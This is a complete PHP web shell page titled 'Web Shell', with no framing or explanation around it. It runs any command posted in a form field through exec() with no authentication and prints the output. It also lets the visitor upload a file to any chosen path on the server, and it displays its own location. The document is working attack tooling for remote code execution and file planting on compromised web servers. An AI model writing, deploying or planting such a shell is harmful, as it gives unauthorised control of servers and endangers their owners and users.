<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Web Shell</title>
<style>
    /* Reset básico */
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background: linear-gradient(to bottom, #0f0f0f, #1c1c1c);
        color: #f0f0f0;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 20px;
        min-height: 100vh;
    }
    h1 {
        font-size: 2.5rem;
        margin-bottom: 10px;
        color: #00ffcc;
        text-shadow: 0 0 10px #00ffccaa;
    }
    .info {
        font-size: 0.9rem;
        color: #aaa;
        margin-bottom: 30px;
        text-align: center;
    }
    .card {
        background: #1a1a1a;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 0 15px #00ffcc55;
        width: 100%;
        max-width: 800px;
        margin-bottom: 30px;
    }
    .card h2 {
        margin-bottom: 15px;
        color: #00ffcc;
        font-size: 1.5rem;
    }
    input[type="text"], input[type="file"] {
        width: calc(100% - 120px);
        padding: 10px;
        margin-right: 10px;
        border-radius: 6px;
        border: none;
        font-size: 1rem;
        background: #2a2a2a;
        color: #fff;
    }
    input[type="text"]:focus { outline: none; background: #3a3a3a; }
    input[type="submit"] {
        padding: 10px 25px;
        border: none;
        border-radius: 6px;
        background-color: #00ffcc;
        color: #000;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
    }
    input[type="submit"]:hover { background-color: #00ddb3; }
    .output {
        background: #111;
        color: #0f0;
        padding: 15px;
        border-radius: 8px;
        font-family: monospace;
        white-space: pre-wrap;
        margin-top: 15px;
        box-shadow: 0 0 10px #00ffcc55;
    }
    ::placeholder { color: #888; font-style: italic; }
</style>
<script>
    function focusIn(obj) { if(obj.value==obj.defaultValue)obj.value=''; }
    function focusOut(obj){ if(obj.value=='')obj.value=obj.defaultValue; }
</script>
</head>
<body>

<h1>Web Shell</h1>
<div class="info">
    WebShell Location: http://<?php echo $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?><br>
    HTTP_HOST = <?php echo $_SERVER['HTTP_HOST']; ?><br>
    REQUEST_URI = <?php echo $_SERVER['REQUEST_URI']; ?>
</div>

<div class="card">
    <h2>Execute Commands</h2>
    <form method="post">
        <input type="text" name="cmd" maxlength="500" value="Enter command to execute" 
               onfocus="focusIn(this)" onblur="focusOut(this)" placeholder="Enter command to execute">
        <input type="submit" name="exec" value="Execute">
    </form>
    <?php
        if(isset($_POST['exec'])){
            $result=[];
            exec($_POST['cmd'],$result);
            echo '<div class="output">';
            foreach($result as $line){ echo htmlspecialchars($line) . "\n"; }
            echo '</div>';
        }
    ?>
</div>

<div class="card">
    <h2>Upload File</h2>
    <form enctype="multipart/form-data" method="post">
        <input type="file" name="file" required>
        <input type="submit" name="upload" value="Upload"><br><br>
        <input type="text" name="target" size="100" 
               value="Target path including file name" onfocus="focusIn(this)" onblur="focusOut(this)" required>
    </form>
    <?php
        if(isset($_POST['upload'])){
            $target = $_POST['target'] ?? '';
            if($target){
                if(move_uploaded_file($_FILES['file']['tmp_name'],$target)){
                    echo '<div class="output">✅ File uploaded successfully!</div>';
                } else {
                    echo '<div class="output">❌ Upload failed.</div>';
                }
            }
        }
    ?>
</div>

</body>
</html>

